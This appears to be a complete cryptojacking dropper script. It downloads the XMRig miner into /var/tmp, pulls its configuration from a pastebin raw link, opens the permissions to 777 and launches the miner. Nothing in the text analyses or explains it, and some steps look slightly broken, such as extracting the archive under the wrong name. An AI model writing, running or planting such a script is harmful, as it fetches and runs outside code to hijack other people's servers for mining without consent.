#!/bin/sh
curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
curl -o /var/tmp/config.json https://pastebin.com/raw/9sxsXLrM
chmod 777 /var/tmp/xmrig
cd /var/tmp
tar -xvf xmrig
./xmrig -c config.json

